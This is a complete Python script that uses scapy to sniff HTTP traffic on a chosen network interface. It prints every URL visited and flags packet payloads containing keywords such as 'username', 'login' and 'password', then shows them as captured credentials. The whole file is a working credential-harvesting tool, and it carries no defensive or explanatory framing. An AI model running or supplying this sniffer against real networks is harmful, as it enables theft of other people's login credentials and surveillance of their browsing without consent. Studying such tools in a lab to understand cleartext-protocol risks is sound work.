#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)

        #another way to convert bytes to string is url.decode() 

        print("\033[1;32m[+] Url visited: \033[0m" + url)
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["uname", "username", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print("\033[1;35m[+] Possible username and passwords: \033[0m" + load)
                    break

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "-iface", dest = "interface", help = "Enter interface name.")
    options = parser.parse_args()
    return options

options = get_arguments()
sniff(options.interface)